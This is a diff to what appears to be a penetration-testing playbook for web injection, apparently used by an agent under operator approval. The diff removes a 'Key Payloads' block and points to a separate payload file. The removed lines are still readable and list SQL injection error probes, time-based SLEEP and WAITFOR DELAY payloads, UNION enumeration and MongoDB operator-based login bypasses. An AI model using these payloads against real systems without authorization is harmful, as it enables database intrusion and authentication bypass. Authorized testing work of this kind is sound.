@@ -128,29 +128,7 @@ with operator approval, 0 under `no_bruteforce`.
 Distill when confirmed - reusable NoSQL/ORM bypass, GENERIC, no client host:
 `python3 scripts/wiki-stage.py --kind technique --slug <slug> --target-page techniques/web/sql-injection.md`
 
-## Key Payloads
-```sql
--- Error probes
-' '' ` ') ")) ' OR '1'='1 admin'--
-
--- Time-based (MySQL)
-' AND SLEEP(5)--
-
--- Time-based (MSSQL)
-'; WAITFOR DELAY '0:0:5'--
-
--- UNION (find column count first)
-' ORDER BY 1-- ' ORDER BY 10--
-' UNION SELECT NULL,NULL,NULL--
-' UNION SELECT 1,database(),3--
-
--- NoSQL (MongoDB JSON body)
-{"username": {"$gt": ""}, "password": {"$gt": ""}}
-{"username": {"$regex": ".*"}}
-
--- NoSQL (query string)
-username[$ne]=invalid&password[$ne]=invalid
-```
+Payload tables: see `references/payloads.md`
 
 ## Chaining
 
